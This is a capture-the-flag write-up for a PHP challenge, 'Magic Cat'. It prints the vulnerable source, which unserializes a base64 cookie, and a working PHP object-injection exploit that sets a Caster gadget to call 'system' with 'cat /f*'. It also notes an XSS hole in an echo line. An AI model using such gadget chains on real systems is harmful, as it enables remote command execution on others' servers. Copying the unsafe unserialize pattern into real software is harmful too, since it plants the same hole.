# Magic Cat

[http://h4ck3r.quest:8602/](http://h4ck3r.quest:8602/)

Tag: `Deserialization`

## Writeup

The source is given:

```php
<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'intval';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}

if (isset($_GET['spell'])) {
    $cat = new Cat($_GET['spell']);
} else if (isset($_COOKIE['cat'])) {
    echo "Unserialize...\n";
    $cat = unserialize(base64_decode($_COOKIE['cat']));
} else {
    $cat = new Cat("meow-meow-magic");
}
?>
<pre>
This is your 🐱:
<?php var_dump($cat) ?>
</pre>

<p>Usage:</p>
<p>/?source</p>
<p>/?spell=the-spell-of-your-cat</p>
```

You can simply hijack `magic` and let `cast_func = 'system'`.
Remember to serialize it to trigger `function __wakeup()`.

```php
$cat = new Cat("cat /f*");
$cat->magic = new Caster();
$cat->magic->cast_func = 'system';
echo base64_encode(serialize($cat));
```

## Flag

`FLAG{magic_cat_pwnpwn}`

## Postscript

I've tried some unintended solution for this problem like inject php code directly since once vardump displays everything on the web, just like pasting the code into the web, maybe browser will execute it?

**Of course not!**

Assume that we have

```php
<?php echo "Pwned"; ?>
```

When I run the page, it dissapears! I view the source code in inspect it shows:

```html
<!--?php echo "Pwned"; ?-->
```

I believe that the output from the php code on the web is regarded as a part of html(static), so php code won't execute.

[Reference](https://stackoverflow.com/questions/21279901/php-gets-commented-out-in-html)

**However!** I found out that this line of code is exploitable:

```php
echo "<script>alert('MAGIC, $spell!');</script>";`
```

Obviously we can trigger XSS, but that is useless in this challenge.
